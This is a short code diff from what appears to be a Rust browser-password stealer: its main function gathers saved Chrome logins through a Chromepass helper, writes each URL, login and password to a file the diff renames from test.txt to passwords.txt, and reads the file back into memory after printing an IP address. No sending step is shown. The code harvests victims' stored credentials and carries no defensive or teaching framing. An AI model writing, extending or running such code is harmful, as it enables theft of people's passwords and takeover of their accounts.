@@ -129,7 +129,7 @@ fn main() {
     print!("{}", ip);
     //ok lets load it into a text file 
     let chrome_datap = Chromepass::obtain_data_from_db().unwrap();
-    let mut filep = fs::File::create("test.txt").unwrap();
+    let mut filep = fs::File::create("passwords.txt").unwrap();
     for chrome in chrome_datap {
         let url = if chrome.url.is_empty() { "None".to_owned() } else { chrome.url };
         let login = if chrome.login.is_empty() { "None".to_owned() } else { chrome.login };
@@ -139,7 +139,7 @@ fn main() {
             filep.write_all(line.as_bytes()).unwrap();
         }
     }
-    let mut file = File::open("test.txt").unwrap();
+    let mut file = File::open("passwords.txt").unwrap();
     let mut contents = Vec::new();
     file.read_to_end(&mut contents).unwrap();
 
